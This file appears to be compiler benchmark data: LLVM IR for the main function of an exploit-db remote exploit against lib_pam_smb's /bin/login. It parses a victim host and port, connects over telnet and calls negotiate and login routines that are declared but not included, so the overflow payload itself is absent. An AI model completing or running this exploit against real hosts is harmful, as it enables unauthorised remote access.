; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_89.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_89.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"linux_pam_smb\0A\00", align 1
@.str.2 = private unnamed_addr constant [53 x i8] c"Linux lib_pam_smb < 1.1.6 /bin/login remote exploit\0A\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"[vertex//lids/org]\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [27 x i8] c"%s -h <victim> [-p port] \0A\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"h:p:u:\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [21 x i8] c"[-] invalid option.\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"[-] must specify a host to attack\0A\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"Host lookup error.\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c"[*] attacking %s:%d\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"[*] opening socket\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [28 x i8] c"[-] could not create socket\00", align 1
@.str.12 = private unnamed_addr constant [29 x i8] c"[-] failed to connect to %s\0A\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"[*] connected!\0A\00", align 1
@.str.14 = private unnamed_addr constant [25 x i8] c"[*] Begin negotiate... \0A\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"[*] Login... \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 -1, i16* %9, align 2
  store i8* null, i8** %11, align 8
  store i8* null, i8** %12, align 8
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i8** %15, align 8
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.2, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %26

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.4, i64 0, i64 0), i8* %24)
  store i32 0, i32* %3, align 4
  br label %102

26:                                               ; preds = %2
  br label %27

27:                                               ; preds = %41, %26
  %28 = load i32, i32* %4, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = call i32 @getopt(i32 %28, i8** %29, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  store i32 %30, i32* %14, align 4
  %31 = icmp ne i32 %30, -1
  br i1 %31, label %32, label %42

32:                                               ; preds = %27
  %33 = load i32, i32* %14, align 4
  switch i32 %33, label %39 [
    i32 104, label %34
    i32 112, label %36
  ]

34:                                               ; preds = %32
  %35 = load i8*, i8** @optarg, align 8
  store i8* %35, i8** %11, align 8
  br label %41

36:                                               ; preds = %32
  %37 = load i8*, i8** @optarg, align 8
  %38 = call signext i16 @atoi(i8* %37)
  store i16 %38, i16* %9, align 2
  br label %41

39:                                               ; preds = %32
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  br label %41

41:                                               ; preds = %39, %36, %34
  br label %27

42:                                               ; preds = %27
  %43 = load i8*, i8** %11, align 8
  %44 = icmp eq i8* %43, null
  br i1 %44, label %45, label %47

45:                                               ; preds = %42
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %102

47:                                               ; preds = %42
  %48 = load i16, i16* %9, align 2
  %49 = sext i16 %48 to i32
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %54

51:                                               ; preds = %47
  %52 = load i8*, i8** %15, align 8
  %53 = call signext i16 @atoi(i8* %52)
  store i16 %53, i16* %9, align 2
  br label %54

54:                                               ; preds = %51, %47
  %55 = load i8*, i8** %11, align 8
  %56 = call %struct.hostent* @gethostbyname(i8* %55)
  store %struct.hostent* %56, %struct.hostent** %7, align 8
  %57 = icmp eq %struct.hostent* %56, null
  br i1 %57, label %58, label %60

58:                                               ; preds = %54
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %102

60:                                               ; preds = %54
  %61 = load i8*, i8** %11, align 8
  %62 = load i16, i16* %9, align 2
  %63 = sext i16 %62 to i32
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0), i8* %61, i32 %63)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0))
  %66 = load i32, i32* @AF_INET, align 4
  %67 = load i32, i32* @SOCK_STREAM, align 4
  %68 = call i32 @socket(i32 %66, i32 %67, i32 0)
  store i32 %68, i32* %8, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %72

70:                                               ; preds = %60
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %102

72:                                               ; preds = %60
  %73 = load i32, i32* @AF_INET, align 4
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %73, i32* %74, align 4
  %75 = load i16, i16* %9, align 2
  %76 = call i32 @htons(i16 signext %75)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i32 %76, i32* %77, align 4
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  %79 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %78, i32 0, i32 0
  %80 = load %struct.hostent*, %struct.hostent** %7, align 8
  %81 = getelementptr inbounds %struct.hostent, %struct.hostent* %80, i32 0, i32 1
  %82 = load i32, i32* %81, align 4
  %83 = load %struct.hostent*, %struct.hostent** %7, align 8
  %84 = getelementptr inbounds %struct.hostent, %struct.hostent* %83, i32 0, i32 0
  %85 = load i32, i32* %84, align 4
  %86 = call i32 @memcpy(i32* %79, i32 %82, i32 %85)
  %87 = load i32, i32* %8, align 4
  %88 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 12)
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %94

91:                                               ; preds = %72
  %92 = load i8*, i8** %11, align 8
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.12, i64 0, i64 0), i8* %92)
  store i32 0, i32* %3, align 4
  br label %102

94:                                               ; preds = %72
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i64 0, i64 0))
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0))
  %97 = load i32, i32* %8, align 4
  %98 = call i32 @negotiate(i32 %97)
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0))
  %100 = load i32, i32* %8, align 4
  %101 = call i32 @login(i32 %100)
  store i32 0, i32* %3, align 4
  br label %102

102:                                              ; preds = %94, %91, %70, %58, %45, %21
  %103 = load i32, i32* %3, align 4
  ret i32 %103
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local signext i16 @atoi(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 signext) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @negotiate(i32) #1

declare dso_local i32 @login(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
